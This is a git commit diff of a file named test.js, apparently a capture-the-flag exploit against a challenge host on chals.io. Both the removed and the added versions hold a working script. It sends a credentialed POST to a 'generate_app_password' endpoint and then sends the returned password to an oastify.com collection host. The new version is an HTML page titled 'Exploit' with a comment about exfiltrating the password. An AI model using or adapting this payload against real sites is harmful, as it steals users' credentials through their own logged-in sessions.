6169cbb63164daaacb0a01ed72f42a1c6bfe3f2f
Michael Kruger <7942469+cablethief@users.noreply.github.com>
2025-06-25 17:16:19 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,10 +1,17 @@
-<script>
-fetch('https://airbnb-hosts-2847774775fe-link-sheriff-1.chals.io/generate_app_password', {
-  method: 'POST',
-  credentials: 'include'
-})
-.then(res => res.json())
-.then(data => {
-  fetch('https://7x50mesogs5y5s8qn7mjp0hoefk68x0lp.oastify.com/?pw=' + encodeURIComponent(data.app_password));
-});
-</script>
+<!DOCTYPE html>
+<html>
+  <head><title>Exploit</title></head>
+  <body>
+    <script>
+      fetch("https://airbnb-hosts-2847774775fe-link-sheriff-1.chals.io/generate_app_password", {
+        method: "POST",
+        credentials: "include"
+      })
+      .then(res => res.json())
+      .then(data => {
+        // Exfiltrate the password to your server
+        fetch("https://8r01gfmpatzzzt2rh8gkj1bp8ge72yvmk.oastify.com/admin?pw=" + encodeURIComponent(data.app_password));
+      });
+    </script>
+  </body>
+</html>
